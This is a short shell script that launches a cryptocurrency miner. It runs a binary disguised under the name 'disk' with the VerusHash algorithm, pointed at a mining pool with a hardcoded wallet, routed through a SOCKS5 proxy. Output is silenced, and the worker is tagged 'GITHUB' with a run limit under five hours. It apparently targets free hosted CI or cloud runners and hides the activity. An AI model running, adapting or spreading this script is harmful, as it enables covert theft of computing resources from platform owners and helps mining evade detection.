#!/bin/sh
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x disk
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=19NGMAFwcdEPfYhW3FjsWMPF22m6WQi2b4
PROXY=socks5://192.252.209.155:14455
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GITHUB)
timeout 280m ./disk -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
echo Sukses
